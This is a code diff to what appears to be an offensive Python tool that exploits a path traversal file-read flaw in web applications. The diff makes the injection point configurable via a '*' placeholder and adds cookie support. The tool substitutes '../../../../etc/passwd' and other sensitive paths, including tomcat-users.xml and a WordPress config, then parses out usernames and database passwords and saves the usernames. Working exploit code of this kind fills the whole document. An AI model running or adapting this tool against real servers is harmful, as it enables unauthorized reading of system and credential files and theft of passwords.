@@ -93,26 +93,29 @@ def process_wordpress_config(data):
         "DB Password": format_color(db_password.group(1), RED) if db_password else "Not Found"
     }
 
-def fetch_page(url):
+def fetch_page(url, cookie=None):
     try:
-        response = requests.get(url, verify=False)
+        headers = {}
+        if cookie:
+            headers['Cookie'] = cookie
+        response = requests.get(url, headers=headers, verify=False)
         response.raise_for_status()
         return response.text
     except requests.RequestException as e:
         print(f"{RED}[-] Failed to fetch page: {e}{RESET}")
         return None
 
-def detect_file_read_vulnerability(base_url, protocol):
-    test_url = urlunparse((protocol, base_url, '/news.php', '', f'file=../../../../../../../../../etc/passwd', ''))
+def detect_file_read_vulnerability(base_url, cookie=None):
+    test_url = base_url.replace('*','../../../../../../../../../etc/passwd')
     print(f"{GREEN}[*] Testing file read vulnerability at {test_url}{RESET}")
-    response = fetch_page(test_url)
+    response = fetch_page(test_url, cookie)
     if response and 'root' in response:
         print(f"{GREEN}[+] File read vulnerability detected.{RESET}")
         return True
     print(f"{RED}[-] File read vulnerability not detected.{RESET}")
     return False
 
-def read_files(base_url, protocol, output_file):
+def read_files(base_url, output_file, cookie=None):
     sensitive_files = {
         "/etc/passwd": process_passwd_data,
         "/opt/tomcat/conf/tomcat-users.xml": process_tomcat_users_data,
@@ -129,9 +132,9 @@ def read_files(base_url, protocol, output_file):
 
     for file_path, process_func in sensitive_files.items():
         prefixed_path = prefix + file_path
-        url = urlunparse((protocol, base_url, '/news.php', '', f'file={prefixed_path}', ''))
+        url = base_url.replace('*', prefixed_path)
         print(f"{GREEN}[*] Trying to read {file_path}{RESET}")
-        page_content = fetch_page(url)
+        page_content = fetch_page(url, cookie)
 
         if page_content:
             try:
@@ -168,19 +171,6 @@ def read_files(base_url, protocol, output_file):
                 file.write(f"{user}\n")
         print(f"{GREEN}[+] Usernames exported to {output_file}{RESET}")
 
-def detect_protocol(url):
-    parsed_url = urlparse(url)
-    scheme = parsed_url.scheme
-    if not scheme:
-        scheme = "http"
-    return scheme
-
-def validate_and_normalize_url(url):
-    parsed_url = urlparse(url)
-    if not parsed_url.path:
-        url = urljoin(url, '/')
-    return url
-
 def print_logo():
     logo = """
  /$$$$$$$
@@ -204,11 +194,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Fetch and process sensitive files from a URL.")
     parser.add_argument('-u', '--url', required=True, help='Base URL with optional scheme (http/https)')
     parser.add_argument('-o', '--output', help='File to save the usernames')
+    parser.add_argument('--cookie', help='Cookie string to be used for the HTTP request')
     args = parser.parse_args()
-
-    base_url = validate_and_normalize_url(args.url)
-    protocol = detect_protocol(base_url)
-    base_url = urlparse(base_url).netloc
-
-    if detect_file_read_vulnerability(base_url, protocol):
-        read_files(base_url, protocol, args.output)
+ 
+    if detect_file_read_vulnerability(args.url, args.cookie):
+        read_files(args.url, args.output, args.cookie)
